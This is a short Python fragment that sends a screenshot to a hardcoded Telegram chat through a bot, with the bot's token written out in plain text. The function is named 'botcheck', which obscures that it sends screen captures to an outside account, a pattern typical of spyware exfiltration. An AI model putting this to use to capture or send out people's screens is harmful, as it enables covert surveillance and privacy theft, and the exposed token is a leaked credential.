import telebot

token = '6504185878:AAHV1rkUulyyU3B57t10HuHuiIRf5Egpq04'
BOT_URL = '900081399'


def botcheck(screenshot):
    bot = telebot.TeleBot(token, parse_mode=None)
    bot.send_photo(BOT_URL, screenshot)
